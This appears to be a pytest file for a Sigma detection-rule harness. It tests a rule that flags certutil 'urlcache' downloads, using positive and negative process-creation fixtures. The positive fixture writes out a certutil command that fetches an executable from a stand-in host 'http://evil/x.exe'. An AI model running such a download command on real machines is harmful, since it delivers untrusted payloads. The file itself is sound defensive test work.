"""
P0.2e · Detection Execution Harness — pytest gate.

Invariants under test:
  1. Positive fixture matches AND negative fixture does not → harness
     returns EXECUTION_VERIFIED.
  2. Positive fixture fails to match → harness returns FAILED
     (contract must not be promoted).
  3. Negative fixture wrongly matches → harness returns FAILED.
  4. Rule that fails strict-parse → harness returns FAILED with the
     parse error preserved.
  5. Engine callable that raises Exception → harness records FAILED
     with error_type and error_message preserved.
  6. Harness is deterministic — same inputs, same output.
"""
from __future__ import annotations
import pytest

from detection_content.detection_harness import (
    HarnessFixture, run_harness,
)
from detection_content.nivxray_native_sigma import evaluate as nx_evaluate
from detection_content.sigma_strict import strict_parse, StrictParseStatus


CERTUTIL_RULE = """
title: certutil download
id: 00000000-0000-0000-0000-000000000010
level: high
tags: [attack.t1105]
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\\certutil.exe'
        CommandLine|contains: 'urlcache'
    condition: selection
"""

POSITIVE_EV = {
    "Image":       "C:\\Windows\\System32\\certutil.exe",
    "CommandLine": "certutil.exe -urlcache -split -f http://evil/x.exe",
    "Product":     "windows",
    "Category":    "process_creation",
}

NEGATIVE_EV = {
    "Image":       "C:\\Windows\\System32\\notepad.exe",
    "CommandLine": "notepad.exe C:\\Users\\me\\report.txt",
    "Product":     "windows",
    "Category":    "process_creation",
}


def test_native_evaluator_matches_positive_and_rejects_negative():
    r = strict_parse(CERTUTIL_RULE)
    assert r.status == StrictParseStatus.PARSED
    assert nx_evaluate(r.rule, POSITIVE_EV) is True
    assert nx_evaluate(r.rule, NEGATIVE_EV) is False


def test_harness_execution_verified_on_correct_pair():
    result = run_harness(
        engine_id       = "nivxray::detection::nivxray_native_sigma",
        rule_body       = CERTUTIL_RULE,
        engine_evaluate = nx_evaluate,
        positive        = HarnessFixture("cert_pos", POSITIVE_EV, True),
        negative        = HarnessFixture("cert_neg", NEGATIVE_EV, False),
    )
    assert result.verdict == "EXECUTION_VERIFIED", result.to_dict()
    assert result.positive_passed is True
    assert result.negative_passed is True


def test_harness_failed_when_positive_does_not_match():
    """Feed a positive fixture that DOESN'T actually contain certutil."""
    result = run_harness(
        engine_id       = "e",
        rule_body       = CERTUTIL_RULE,
        engine_evaluate = nx_evaluate,
        positive        = HarnessFixture("bad_pos", NEGATIVE_EV, True),
        negative        = HarnessFixture("cert_neg", NEGATIVE_EV, False),
    )
    assert result.verdict == "FAILED"
    assert result.positive_passed is False


def test_harness_failed_when_negative_wrongly_matches():
    """Ask harness to expect NO detection on a fixture that clearly matches."""
    result = run_harness(
        engine_id       = "e",
        rule_body       = CERTUTIL_RULE,
        engine_evaluate = nx_evaluate,
        positive        = HarnessFixture("cert_pos", POSITIVE_EV, True),
        negative        = HarnessFixture("wrong_neg", POSITIVE_EV, False),
    )
    assert result.verdict == "FAILED"
    assert result.negative_passed is False


def test_harness_failed_on_bad_rule():
    result = run_harness(
        engine_id       = "e",
        rule_body       = "not: valid: sigma:",
        engine_evaluate = nx_evaluate,
        positive        = HarnessFixture("p", POSITIVE_EV, True),
        negative        = HarnessFixture("n", NEGATIVE_EV, False),
    )
    assert result.verdict == "FAILED"
    assert "error" in result.positive_detail or \
              "parse" in (result.positive_detail or {})


def test_harness_records_evaluator_exception():
    def boom(rule, ev):
        raise RuntimeError("simulated evaluator crash")
    result = run_harness(
        engine_id       = "e",
        rule_body       = CERTUTIL_RULE,
        engine_evaluate = boom,
        positive        = HarnessFixture("p", POSITIVE_EV, True),
        negative        = HarnessFixture("n", NEGATIVE_EV, False),
    )
    assert result.verdict == "FAILED"
    assert result.positive_detail["error_type"] == "RuntimeError"
    assert "simulated" in result.positive_detail["error_message"]


def test_harness_is_deterministic():
    a = run_harness("e", CERTUTIL_RULE, nx_evaluate,
                          HarnessFixture("p", POSITIVE_EV, True),
                          HarnessFixture("n", NEGATIVE_EV, False))
    b = run_harness("e", CERTUTIL_RULE, nx_evaluate,
                          HarnessFixture("p", POSITIVE_EV, True),
                          HarnessFixture("n", NEGATIVE_EV, False))
    # Ignore timestamp differences
    a_d = a.to_dict(); b_d = b.to_dict()
    a_d.pop("ran_at"); b_d.pop("ran_at")
    assert a_d == b_d
